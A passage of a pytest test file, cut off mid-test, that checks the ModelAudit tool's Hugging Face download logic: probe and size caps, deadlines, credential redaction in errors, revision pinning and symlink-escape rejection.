    def test_download_model_preserves_executorch_blocked_suffix_guard(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_get_extensions: MagicMock,
        blocked_suffix: str,
        tmp_path: Path,
    ) -> None:
        """Remote ExecuTorch probes should match local renamed-binary suffix guards."""
        filename = f"payload{blocked_suffix}"
        payload = b"\x0c\x00\x00\x00ET13\x04\x00\x04\x00\x04\x00\x00\x00"
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "model.safetensors").write_bytes(b"weights")
        mock_snapshot_download.return_value = str(download_path)
        mock_requests_get.return_value = _FakeRangeResponse(payload)

        with patch(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            return_value=(["model.safetensors", filename], _HF_TEST_REVISION, None),
        ):
            download_model("https://huggingface.co/test/model")

        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["model.safetensors"]

    @patch("modelaudit.utils.sources.huggingface._HF_CONTENT_SNIFF_MAX_FILES", 1)
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format", return_value=None)
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "preview.png", "notes.txt"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_caps_skipped_file_content_probes(
        self,
        mock_snapshot_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        mock_detect_content: MagicMock,
        _mock_get_extensions: MagicMock,
    ) -> None:
        """Selective filtering should fail closed instead of issuing unbounded remote probes."""
        with pytest.raises(Exception, match="skipped file inspection limit exceeded"):
            download_model("https://huggingface.co/test/model")

        mock_detect_content.assert_called_once_with("test/model", "preview.png", _HF_TEST_REVISION, ANY)
        mock_snapshot_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface._HF_CONTENT_SNIFF_MAX_TOTAL_BYTES", 8 * 1024)
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "hidden.payload"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_caps_total_content_probe_bytes(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
    ) -> None:
        """Selective filtering should fail closed before aggregate remote probes grow unbounded."""
        mock_requests_get.return_value = _FakeRangeResponse(
            b"{" + (b" " * ((8 * 1024) - 1)),
            status_code=206,
            headers={"Content-Range": "bytes 0-8191/100000"},
        )

        with pytest.raises(Exception, match="skipped file inspection byte limit exceeded"):
            download_model("https://huggingface.co/test/model")

        mock_requests_get.assert_called_once()
        mock_snapshot_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface.time.monotonic", return_value=100.0)
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "hidden.payload"], _HF_TEST_REVISION, None),
    )
    @patch("modelaudit.utils.sources.huggingface._get_model_size_with_deadline", return_value=None)
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_deadline_stops_content_probes(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_get_model_size: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        _mock_monotonic: MagicMock,
    ) -> None:
        """Non-streaming acquisition should stop before a probe exceeds the scan deadline."""

        def expire_probe_budget(budget: _HuggingFaceProbeBudget, repo_id: str) -> float:
            assert budget.deadline == 101.0
            raise TimeoutError(f"Hugging Face acquisition timed out for {repo_id}")

        with (
            patch.object(
                _HuggingFaceProbeBudget,
                "request_timeout",
                autospec=True,
                side_effect=expire_probe_budget,
            ),
            pytest.raises(
                Exception,
                match=r"(?:hidden\.payload \(TimeoutError\)|acquisition timed out for test/model)",
            ),
        ):
            download_model("https://huggingface.co/test/model", timeout_seconds=1)

        _mock_list_repo_files.assert_called_once_with("test/model", 1.0, deadline=101.0, revision=None)
        mock_requests_get.assert_not_called()
        mock_snapshot_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface.time.monotonic", return_value=100.0)
    @patch("modelaudit.utils.sources.huggingface._get_model_size_with_deadline")
    def test_download_model_starts_deadline_before_model_size_lookup(
        self,
        mock_get_model_size: MagicMock,
        _mock_monotonic: MagicMock,
    ) -> None:
        """Optional model-size metadata must consume the end-to-end acquisition budget."""
        mock_get_model_size.side_effect = RuntimeError("stop after model-size lookup")

        with pytest.raises(RuntimeError, match="stop after model-size lookup"):
            download_model("https://huggingface.co/test/model", timeout_seconds=1)

        mock_get_model_size.assert_called_once_with("test/model", 101.0, revision=None)

    @patch("modelaudit.utils.sources.huggingface.time.monotonic", return_value=100.0)
    @patch("modelaudit.utils.sources.huggingface._get_model_size_with_deadline")
    def test_download_model_passes_requested_revision_to_model_size_lookup(
        self,
        mock_get_model_size: MagicMock,
        _mock_monotonic: MagicMock,
    ) -> None:
        """Disk preflight should size the same pinned revision that will be downloaded."""
        mock_get_model_size.side_effect = RuntimeError("stop after model-size lookup")

        with pytest.raises(RuntimeError, match="stop after model-size lookup"):
            download_model(f"hf://test/model?revision={_HF_TEST_REVISION}", timeout_seconds=1)

        mock_get_model_size.assert_called_once_with(
            "test/model",
            101.0,
            revision=_HF_TEST_REVISION,
        )

    @patch("modelaudit.utils.sources.huggingface._run_huggingface_worker_with_deadline")
    def test_huggingface_path_sizes_use_terminable_deadline_worker(
        self,
        mock_run_worker: MagicMock,
    ) -> None:
        """Capped metadata requests should remain terminable under the shared deadline."""
        mock_run_worker.return_value = {
            "value": {
                "revision": _HF_TEST_REVISION,
                "sizes": [{"path": "model.bin", "size": 7}],
            }
        }

        sizes, revision = _get_huggingface_path_sizes(
            "test/model",
            ["model.bin"],
            resolved_revision=_HF_TEST_REVISION,
            deadline=123.0,
        )

        assert sizes == {"model.bin": 7}
        assert revision == _HF_TEST_REVISION
        mock_run_worker.assert_called_once_with(
            "get_path_sizes",
            {
                "repo_id": "test/model",
                "filenames": ["model.bin"],
                "requested_revision": None,
                "resolved_revision": _HF_TEST_REVISION,
            },
            123.0,
            "test/model",
        )

    @patch("huggingface_hub.HfApi.get_paths_info")
    def test_huggingface_path_sizes_reject_conflicting_duplicate_metadata(
        self,
        mock_get_paths_info: MagicMock,
    ) -> None:
        """Conflicting duplicate size evidence must not weaken aggregate download caps."""
        mock_get_paths_info.return_value = [
            SimpleNamespace(path="model.bin", size=1500),
            SimpleNamespace(path="model.bin", size=1),
        ]

        with pytest.raises(Exception, match=r"inconsistent size metadata for selected file model\.bin"):
            _get_huggingface_path_sizes("test/model", ["model.bin"], resolved_revision=_HF_TEST_REVISION)

    @patch("huggingface_hub.HfApi.get_paths_info")
    def test_huggingface_path_sizes_batches_large_selections(
        self,
        mock_get_paths_info: MagicMock,
    ) -> None:
        """Selected-file metadata should stay under the Hub path-info batch limit."""
        filenames = [f"shard-{idx:04d}.bin" for idx in range(513)]
        mock_get_paths_info.side_effect = [
            [SimpleNamespace(path=filename, size=1) for filename in filenames[:512]],
            [SimpleNamespace(path=filenames[512], size=1)],
        ]

        sizes, revision = _get_huggingface_path_sizes(
            "test/model",
            filenames,
            resolved_revision=_HF_TEST_REVISION,
        )

        assert sizes == dict.fromkeys(filenames, 1)
        assert revision == _HF_TEST_REVISION
        assert mock_get_paths_info.call_args_list == [
            call("test/model", filenames[:512], revision=_HF_TEST_REVISION),
            call("test/model", filenames[512:], revision=_HF_TEST_REVISION),
        ]

    @patch("modelaudit.utils.sources.huggingface.time.monotonic", return_value=100.0)
    @patch("requests.get")
    def test_huggingface_prefix_rechecks_deadline_between_chunks(
        self,
        mock_requests_get: MagicMock,
        _mock_monotonic: MagicMock,
    ) -> None:
        """A slow streaming response must not run past the acquisition deadline."""
        response = MagicMock()
        response.__enter__.return_value = response

        def iter_content(*_args: object, **_kwargs: object) -> Iterator[bytes]:
            yield b"first"
            _mock_monotonic.return_value = 102.0
            yield b"second"

        response.iter_content.side_effect = iter_content
        mock_requests_get.return_value = response
        budget = _HuggingFaceProbeBudget(remaining_bytes=1024, deadline=101.0)

        with pytest.raises(ValueError, match=r"payload\.bin \(TimeoutError\)"):
            _read_huggingface_prefix("test/model", "payload.bin", _HF_TEST_REVISION, budget, 1024)

        response.raise_for_status.assert_called_once_with()

    @patch("modelaudit.utils.sources.huggingface._terminate_huggingface_download_process")
    @patch("modelaudit.utils.sources.huggingface.subprocess.Popen")
    def test_download_worker_is_terminated_at_deadline(
        self,
        mock_popen: MagicMock,
        mock_terminate: MagicMock,
    ) -> None:
        """A blocking SDK transfer must not outlive the acquisition deadline."""
        process = mock_popen.return_value
        process.args = ["worker"]
        process.communicate.side_effect = subprocess.TimeoutExpired(process.args, timeout=1)

        with pytest.raises(TimeoutError, match="acquisition timed out"):
            _run_huggingface_download_with_deadline(
                "snapshot_download",
                {"repo_id": "test/model"},
                time.monotonic() + 1,
                "test/model",
            )

        mock_terminate.assert_called_once_with(process)

    @patch("modelaudit.utils.sources.huggingface.subprocess.Popen")
    def test_download_worker_captures_unredacted_child_stderr(self, mock_popen: MagicMock) -> None:
        """SDK diagnostics must not bypass the parent's Hugging Face URL redaction."""
        process = mock_popen.return_value
        process.communicate.return_value = (
            'MODELAUDIT_HF_DOWNLOAD_RESULT={"ok": true, "path": "/tmp/model"}\n',
            "https://cdn.example/model?token=secret",
        )

        result = _run_huggingface_download_with_deadline(
            "snapshot_download",
            {"repo_id": "test/model"},
            time.monotonic() + 1,
            "test/model",
        )

        assert result == "/tmp/model"
        assert mock_popen.call_args.kwargs["stderr"] is subprocess.PIPE

    @patch("modelaudit.utils.sources.huggingface.subprocess.Popen")
    def test_download_worker_redacts_signed_transport_error(self, mock_popen: MagicMock) -> None:
        """Serialized worker failures must not expose signed CDN credentials."""
        process = mock_popen.return_value
        process.communicate.return_value = (
            "MODELAUDIT_HF_DOWNLOAD_RESULT="
            '{"ok": false, "error_type": "HTTPError", '
            '"error": "denied https://user:pass@cas-bridge.xethub.hf.co/object?'
            'X-Amz-Credential=secret&X-Amz-Signature=signed"}\n',
            "",
        )

        with pytest.raises(RuntimeError) as exc_info:
            _run_huggingface_download_with_deadline(
                "snapshot_download",
                {"repo_id": "test/model"},
                time.monotonic() + 1,
                "test/model",
            )

        error = str(exc_info.value)
        assert "user:pass" not in error
        assert "secret" not in error
        assert "signed" not in error
        assert "X-Amz-Credential=<redacted>" in error
        assert "X-Amz-Signature=<redacted>" in error

    @patch("modelaudit.utils.sources.huggingface._terminate_huggingface_download_process")
    @patch("modelaudit.utils.sources.huggingface.subprocess.Popen")
    def test_download_worker_is_terminated_on_parent_interrupt(
        self,
        mock_popen: MagicMock,
        mock_terminate: MagicMock,
    ) -> None:
        """Parent interrupts must not leave a transfer subprocess running."""
        process = mock_popen.return_value
        process.communicate.side_effect = KeyboardInterrupt

        with pytest.raises(KeyboardInterrupt):
            _run_huggingface_download_with_deadline(
                "snapshot_download",
                {"repo_id": "test/model"},
                time.monotonic() + 1,
                "test/model",
            )

        mock_terminate.assert_called_once_with(process)

    @pytest.mark.skipif(not hasattr(os, "killpg"), reason="requires POSIX process groups")
    @patch("modelaudit.utils.sources.huggingface.os.killpg")
    def test_download_worker_terminates_posix_process_group(self, mock_killpg: MagicMock) -> None:
        """Timeout cleanup must stop transfer helpers launched by the worker."""
        process = MagicMock()
        process.pid = 1234
        process.communicate.side_effect = [
            subprocess.TimeoutExpired(["worker"], timeout=1),
            ("", ""),
        ]

        with patch("modelaudit.utils.sources.huggingface.os.name", "posix"):
            _terminate_huggingface_download_process(process)

        assert mock_killpg.call_args_list == [
            call(1234, getattr(signal, "SIGTERM", 15)),
            call(1234, getattr(signal, "SIGKILL", 9)),
        ]
        process.terminate.assert_not_called()
        process.kill.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface._run_huggingface_download_with_deadline")
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["model.bin"], _HF_TEST_REVISION, None),
    )
    def test_download_model_bounds_snapshot_transfer(
        self,
        _mock_list_repo_files: MagicMock,
        mock_run_download: MagicMock,
        tmp_path: Path,
    ) -> None:
        """The snapshot transfer should receive the remaining end-to-end deadline."""
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "model.bin").write_bytes(b"weights")
        mock_run_download.return_value = str(download_path)

        result = download_model(
            "https://huggingface.co/test/model",
            cache_dir=tmp_path / "cache",
            timeout_seconds=30,
        )

        assert result == download_path
        operation, kwargs, deadline, repo_id = mock_run_download.call_args.args
        assert operation == "snapshot_download"
        assert kwargs["repo_id"] == "test/model"
        assert deadline > time.monotonic()
        assert repo_id == "test/model"

    @patch("modelaudit.utils.sources.huggingface._list_huggingface_repo_files_paginated")
    @patch("huggingface_hub.HfApi.repo_info")
    def test_list_repo_files_at_revision_returns_matching_sha(
        self,
        mock_repo_info: MagicMock,
        mock_paginated_listing: MagicMock,
    ) -> None:
        """Capped downloads should keep the listing and transfer on one immutable revision."""
        mock_repo_info.return_value = SimpleNamespace(
            sha=TEST_COMMIT_SHA,
            siblings=[SimpleNamespace(rfilename="pytorch_model.bin")],
        )
        mock_paginated_listing.return_value = ["pytorch_model.bin"]

        repo_files, revision = _list_huggingface_repo_files_at_revision(
            "test/model",
            requested_revision=TEST_COMMIT_SHA,
            timeout_seconds=7,
        )

        assert repo_files == ["pytorch_model.bin"]
        assert revision == TEST_COMMIT_SHA
        mock_repo_info.assert_called_once_with(
            "test/model",
            timeout=7,
            files_metadata=False,
            revision=TEST_COMMIT_SHA,
        )
        mock_paginated_listing.assert_called_once_with("test/model", TEST_COMMIT_SHA, timeout_seconds=7)

    @patch("huggingface_hub.HfApi.repo_info")
    def test_list_repo_files_at_revision_rejects_mutable_revision(self, mock_repo_info: MagicMock) -> None:
        """Capped downloads must not trust a mutable or abbreviated revision."""
        mock_repo_info.return_value = SimpleNamespace(
            sha="main",
            siblings=[SimpleNamespace(rfilename="pytorch_model.bin")],
        )

        with pytest.raises(Exception, match="immutable commit SHA"):
            _list_huggingface_repo_files_at_revision("test/model")

    @patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format", return_value=None)
    @patch("modelaudit.utils.sources.huggingface.get_model_size", return_value=None)
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={"", ".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["notes.unknown"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_listing_success_without_scannable_files_fails_closed(
        self,
        mock_snapshot_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        _mock_get_model_size: MagicMock,
        _mock_detect_content: MagicMock,
        tmp_path: Path,
    ) -> None:
        """A successful listing with no scannable files must not fall back to a full snapshot."""
        cache_dir = tmp_path / "cache"
        download_path = cache_dir / "huggingface" / "test" / "model"

        with pytest.raises(
            Exception,
            match="Refusing to download full snapshot for test/model: "
            "repository listing contains no recognized ModelAudit-scannable files",
        ):
            download_model("https://huggingface.co/test/model", cache_dir=cache_dir)

        mock_snapshot_download.assert_not_called()
        assert not download_path.exists()

    @patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format", return_value=None)
    @patch("modelaudit.utils.sources.huggingface.get_model_size", return_value=None)
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={"", ".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["notes.unknown"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_listing_without_scannable_files_preserves_existing_cache(
        self,
        mock_snapshot_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        _mock_get_model_size: MagicMock,
        _mock_detect_content: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Fail-closed listing checks must not delete a user's preexisting cache."""
        cache_dir = tmp_path / "cache"
        download_path = cache_dir / "huggingface" / "test" / "model"
        download_path.mkdir(parents=True)
        cached_file = download_path / "cached.bin"
        cached_file.write_bytes(b"cached")

        with pytest.raises(Exception, match="repository listing contains no recognized ModelAudit-scannable files"):
            download_model("https://huggingface.co/test/model", cache_dir=cache_dir)

        mock_snapshot_download.assert_not_called()
        assert cached_file.read_bytes() == b"cached"

    @patch("modelaudit.utils.sources.huggingface.get_model_size", return_value=None)
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=([], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_empty_listing_fails_closed(
        self,
        mock_snapshot_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_model_size: MagicMock,
    ) -> None:
        """An empty successful listing should not trigger a full-snapshot download."""
        with pytest.raises(
            Exception,
            match="Refusing to download full snapshot for test/model: "
            "repository listing contains no recognized ModelAudit-scannable files",
        ):
            download_model("https://huggingface.co/test/model")

        mock_snapshot_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface.get_model_size", return_value=None)
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".safetensors"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["nested/MODEL.SaFeTeNsOrS"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_listing_accepts_mixed_case_scannable_suffix(
        self,
        mock_snapshot_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        _mock_get_model_size: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Supported remote suffixes should match local case-insensitive routing."""
        download_path = tmp_path / "download"
        model_path = download_path / "nested" / "MODEL.SaFeTeNsOrS"
        model_path.parent.mkdir(parents=True)
        model_path.write_bytes(b"weights")
        mock_snapshot_download.return_value = str(download_path)

        download_model("https://huggingface.co/test/model")

        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["nested/MODEL.SaFeTeNsOrS"]

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin", ".safetensors"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "model.safetensors"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.HfApi.get_paths_info")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_max_size_rejects_oversized_selected_files(
        self,
        mock_snapshot_download: MagicMock,
        mock_get_paths_info: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
    ) -> None:
        """Repository downloads should enforce max-size before snapshot transfer."""
        mock_get_paths_info.return_value = [
            SimpleNamespace(path="pytorch_model.bin", size=700),
            SimpleNamespace(path="model.safetensors", size=500),
        ]

        with pytest.raises(Exception, match="selected Hugging Face files total 1200 bytes exceeds max size 1000 bytes"):
            download_model("https://huggingface.co/test/model", max_size=1000)

        mock_snapshot_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin", ".safetensors"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.HfApi.get_paths_info")
    @patch("huggingface_hub.snapshot_download")
    @pytest.mark.parametrize("file_size", [None, -1, "100", True])
    def test_download_model_max_size_rejects_unknown_selected_file_size(
        self,
        mock_snapshot_download: MagicMock,
        mock_get_paths_info: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        file_size: object,
    ) -> None:
        """Unknown selected file sizes should fail closed before download."""
        mock_get_paths_info.return_value = [SimpleNamespace(path="pytorch_model.bin", size=file_size)]

        with pytest.raises(Exception, match=r"unknown size for selected file pytorch_model\.bin"):
            download_model("https://huggingface.co/test/model", max_size=1000)

        mock_snapshot_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.HfApi.get_paths_info")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_max_size_rejects_missing_selected_file_metadata(
        self,
        mock_snapshot_download: MagicMock,
        mock_get_paths_info: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
    ) -> None:
        """Missing metadata for a selected file should fail closed under a cap."""
        mock_get_paths_info.return_value = []

        with pytest.raises(Exception, match=r"unknown size for selected file pytorch_model\.bin"):
            download_model("https://huggingface.co/test/model", max_size=1000)

        mock_snapshot_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.HfApi.get_paths_info")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_max_size_allows_under_limit_selected_files(
        self,
        mock_snapshot_download: MagicMock,
        mock_get_paths_info: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Under-limit repository downloads should still use selective allow patterns."""
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "pytorch_model.bin").write_bytes(b"weights")
        mock_snapshot_download.return_value = str(download_path)
        mock_get_paths_info.return_value = [SimpleNamespace(path="pytorch_model.bin", size=700)]

        download_model("https://huggingface.co/test/model", max_size=1000)

        mock_get_paths_info.assert_called_once_with("test/model", ["pytorch_model.bin"], revision=_HF_TEST_REVISION)
        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["pytorch_model.bin"]
        assert mock_snapshot_download.call_args.kwargs["revision"] == _HF_TEST_REVISION

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.HfApi.get_paths_info")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_max_size_allows_hf_cache_blob_symlink(
        self,
        mock_snapshot_download: MagicMock,
        mock_get_paths_info: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
        requires_symlinks: None,
    ) -> None:
        """Capped default-cache snapshots should allow normal Hub blob symlinks."""
        repo_cache = tmp_path / "hf-cache" / "hub" / "models--test--model"
        download_path = repo_cache / "snapshots" / _HF_TEST_REVISION
        blob_path = repo_cache / "blobs" / "abc123"
        download_path.mkdir(parents=True)
        blob_path.parent.mkdir(parents=True)
        blob_path.write_bytes(b"weights")
        (download_path / "pytorch_model.bin").symlink_to(Path("..") / ".." / "blobs" / blob_path.name)
        mock_snapshot_download.return_value = str(download_path)
        mock_get_paths_info.return_value = [SimpleNamespace(path="pytorch_model.bin", size=7)]

        download_model("https://huggingface.co/test/model", max_size=1000)

        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["pytorch_model.bin"]
        assert mock_snapshot_download.call_args.kwargs["revision"] == _HF_TEST_REVISION

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.HfApi.get_paths_info")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_max_size_rejects_underreported_snapshot(
        self,
        mock_snapshot_download: MagicMock,
        mock_get_paths_info: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Capped repository downloads should verify selected files after transfer."""
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "pytorch_model.bin").write_bytes(b"oversized")
        mock_snapshot_download.return_value = str(download_path)
        mock_get_paths_info.return_value = [SimpleNamespace(path="pytorch_model.bin", size=4)]

        with pytest.raises(Exception, match="downloaded selected Hugging Face files total 9 bytes exceeds max size 4"):
            download_model("https://huggingface.co/test/model", max_size=4)

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.HfApi.get_paths_info")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_max_size_rejects_symlink_escape_after_transfer(
        self,
        mock_snapshot_download: MagicMock,
        mock_get_paths_info: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
        requires_symlinks: None,
    ) -> None:
        """Capped downloads should not accept arbitrary selected-file symlink escapes."""
        download_path = tmp_path / "download"
        escaped_target = tmp_path / "outside.bin"
        download_path.mkdir()
        escaped_target.write_bytes(b"weights")
        (download_path / "pytorch_model.bin").symlink_to(escaped_target)
        mock_snapshot_download.return_value = str(download_path)
        mock_get_paths_info.return_value = [SimpleNamespace(path="pytorch_model.bin", size=7)]

        with pytest.raises(Exception, match="downloaded selected file symlink target escaped: pytorch_model\\.bin"):
            download_model("https://huggingface.co/test/model", max_size=1000)

    @patch("modelaudit.utils.sources.huggingface.get_model_size", return_value=None)
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.HfApi.get_paths_info")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_zero_max_size_preserves_unlimited_behavior(
        self,
        mock_snapshot_download: MagicMock,
        mock_get_paths_info: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        _mock_get_model_size: MagicMock,
        tmp_path: Path,
    ) -> None:
        """A zero cap should keep the documented unlimited-size behavior."""
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "pytorch_model.bin").write_bytes(b"weights")
        mock_snapshot_download.return_value = str(download_path)

        download_model("https://huggingface.co/test/model", max_size=0)

        mock_get_paths_info.assert_not_called()
        assert mock_snapshot_download.call_args.kwargs["revision"] == _HF_TEST_REVISION

    @patch("modelaudit.utils.sources.huggingface._list_repo_files_with_timeout")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_negative_max_size_fails_closed(
        self,
        mock_snapshot_download: MagicMock,
        mock_list_repo_files: MagicMock,
    ) -> None:
        """Negative repository download limits should never silently disable enforcement."""
        with pytest.raises(Exception, match="Maximum download size must be non-negative"):
            download_model("https://huggingface.co/test/model", max_size=-1)

        mock_list_repo_files.assert_not_called()
        mock_snapshot_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["model[latest].bin"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.HfApi.get_paths_info")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_max_size_escapes_literal_selected_filenames(
        self,
        mock_snapshot_download: MagicMock,
        mock_get_paths_info: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Budgeted literal filenames must not widen into Hub glob matches."""
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "model[latest].bin").write_bytes(b"weights")
        mock_snapshot_download.return_value = str(download_path)
        mock_get_paths_info.return_value = [SimpleNamespace(path="model[latest].bin", size=700)]

        download_model("https://huggingface.co/test/model", max_size=1000)

        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["model[[]latest].bin"]
        assert mock_snapshot_download.call_args.kwargs["revision"] == _HF_TEST_REVISION

    @patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format", return_value=None)
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["notes.unknown"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.HfApi.get_paths_info")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_max_size_without_scannable_files_fails_closed(
        self,
        mock_snapshot_download: MagicMock,
        mock_get_paths_info: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        _mock_detect_content: MagicMock,
    ) -> None:
        """A cap must not re-enable full-repository fallback when routing finds no model."""
        with pytest.raises(Exception, match="repository listing contains no recognized ModelAudit-scannable files"):
            download_model("https://huggingface.co/test/model", max_size=1000)

        mock_get_paths_info.assert_not_called()
        mock_snapshot_download.assert_not_called()

    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(None, None, "repository listing unavailable"),
    )
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_max_size_rejects_listing_failure_before_extension_allowlist(
        self,
        mock_snapshot_download: MagicMock,
        _mock_list_repo_files: MagicMock,
    ) -> None:
        """When max-size is set, listing failures cannot fall back to broad extension globs."""
        with pytest.raises(Exception, match="selective filtering incomplete: failed listing files"):
